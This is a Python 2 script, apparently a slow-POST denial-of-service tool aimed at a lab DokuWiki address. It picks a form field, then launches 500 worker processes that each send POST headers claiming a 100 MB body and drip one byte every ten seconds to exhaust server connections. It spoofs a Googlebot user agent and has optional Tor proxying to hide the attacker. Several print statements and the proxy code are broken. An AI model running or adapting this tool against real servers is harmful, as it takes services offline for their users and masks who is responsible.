#!/usr/bin/env python

import requests
import requesocks
import socket
import sys
import re
import random
import time

from bs4 import BeautifulSoup
from urlparse import urlparse
from multiprocessing import Process

MAX_WORKERS   = 500
SLEEP_TIME    = 10
PROXY_ADDRESS = '127.0.0.1'
PROXY_PORT    = 9050
DEFAULT_USER_AGENT   = '%s' %\
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'

def form_to_dict(form):
    
    form_dict = {
        'action' : form.get('action', ''),
        'method' : form.get('method', 'post'),
        'id' : form.get('id', ''),
        'class' : form.get('class', ''),
        'inputs' : [],
    }
    
    for index, input_field in enumerate(form.findAll('input')):

        form_dict['inputs'].append({
            'id' : input_field.get('id', ''),
            'class' : input_field.get('class', ''),
            'name' : input_field.get('name', ''),
            'value' : input_field.get('value', ''),
            'type' : input_field.get('type', ''),
        })
    return form_dict

def get_forms(response):
    
    soup = BeautifulSoup(response.text)

    forms = []
    for form in soup.findAll('form'):
        
        forms.append(form_to_dict(form))

    return forms

def print_forms(forms):

    for index,form in enumerate(forms):
        print 'Form #%d --> id: %s --> class: %s --> action: %s' %\
                (index, form['id'], form['class'], form['action'])



def choose_form(response):
    forms = get_forms(response)

    return make_choice(print_forms,
                'Please select a form from the list above.',
                forms,
                'form')

def choose_input(form):

    return make_choice(print_inputs,
                    'Please select a form field from the list above.',
                    form['inputs'],
                    'input')

def print_inputs(inputs):

    for index, input_field in enumerate(inputs):
        print 'Input #%d: %s' %\
            (index, input_field['name'])

def make_choice(menu_function, prompt, choices, field):

    while True:
        try:
            menu_function(choices)
            index = int(raw_input('Enter %s number: ' % field))
            return choices[index]
        except IndexError:
            print 'That is not a valid choice.'
        except ValueError:
            print 'That is not a valid choice.'
        print

def craft_headers(path, host, user_agent, param, cookies):

    return '\n'.join([

        'POST %s HTTP/1.1' % path,
        'Host: %s' % host,
        'Connection: keep-alive',
        'Content-Length: 100000000',
        'User-Agent: %s' % user_agent,
        'cookies',
        '%s=' % param, 
    ])

def host_from_url(url):

    p = '(?:http.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*).*'
    m = re.search(p,url)
    return m.group('host')

def port_from_url(url):

    p = '(?:http.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*).*'
    m = re.search(p,url)
    port = m.group('port')
    if port == '':
        return 80
    return int(port)

def parse_args():

    return {
        'use_proxies' : False,
        'proxies' : [{ 'address' : PROXY_ADDRESS, 'port' : PROXY_PORT }],
        'target' : 'http://192.168.99.102/doku.php',
        'max_workers' : MAX_WORKERS,
        'user_agent_file' : '',
        'sleep_time' : SLEEP_TIME,
    }
    
def configure():

    args = parse_args()

    if args['use_proxies']:
        session = requesocks.session()
        proxy = args['proxies'][0]
        session.proxies = {
                'http': 'socks4://%s:%d' % (proxy['address'],proxy['port']),
                'https': 'socks4://%s:%d' % (proxy['address'],proxy['port']),
        }
    else:
        session = requests.session()

    response = requests.get(args['target'])

    form = choose_form(response)
    form_field = choose_input(form)

    cookies = response.headers.get('set-cookie', '')

    parsed_url = urlparse(args['target'])

    if form['action'] != '':
        if form['action'].startswith('/'):
            target = 'http://%s%s' % (parsed_url.netloc, form['action'])
    else:
        target = args['target']

    user_agents = [DEFAULT_USER_AGENT]
    if args['user_agent_file'] != '':
        with open(args['user_agent_file']) as fd:
            user_agents += fd.read().split('\n')

    return {

        'path' : parsed_url.path,
        'param' : form_field['name'],
        'host' : host_from_url(target),
        'port' : port_from_url(target),
        'target' : target,
        'cookies' : cookies,
        'user_agents' : user_agents,
        'max_workers' : args['max_workers'],
        'sleep_time' : args['sleep_time'],
        'use_proxies' : args['use_proxies'],
        'proxies' : args['proxies'],
    }

def launch_attack(i, configs, headers):

    try:

        print '[worker %d] Establishing connection'
        # establish connection 
        if configs['use_proxies']:

            # select proxy
            proxy = random.choice(configs['proxies'])
            print '[worker %d] Using socks proxy %s:%d' % (proxy['address'], proxy['port'])

            # connect through proxy
            sock = socksocket()
            sock.setproxy(PROXY_TYPE_SOCK4, proxy['address'], proxy['port'])

        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((configs['host'], configs['port']))

        print '[worker %d] Successfully connected to %s' % (i, configs['target'])

        # start dos attack
        print '[worker %d] Beginning HTTP session... sending headers' % i
        sock.send(headers)
        while True:
            print '[worker %d] Sending one byte to target.' % i
            sock.send("A")
            print '[worker %d] Sleeping for %d seconds' % (configs['sleep_time'], i)
            time.sleep(configs['sleep_time'])
    except KeyboardInterrupt:
        pass
    sock.close()

#def launch_attack(i, configs, headers):
#

#    while True:
#        print "Worker #%d: sending \x41" % i
#        time.sleep(configs['sleep_time'])
#    print 'Worker #%d: closing connection' % i

if __name__ == '__main__':

    configs = configure()

    workers = []
    try:
        for i in xrange(configs['max_workers']):

            headers = craft_headers(configs['path'],
                                configs['host'],
                                random.choice(configs['user_agents']),
                                configs['param'],
                                configs['cookies'])

            p = Process(target=launch_attack, args=(i, configs, headers))
            p.start()
            workers.append(p)

        for w in workers:
            w.join()

    except KeyboardInterrupt:

        print '\n[!] Exiting on User Interrupt'
        for w in workers:
            w.terminate()
        for w in workers:
            w.join()
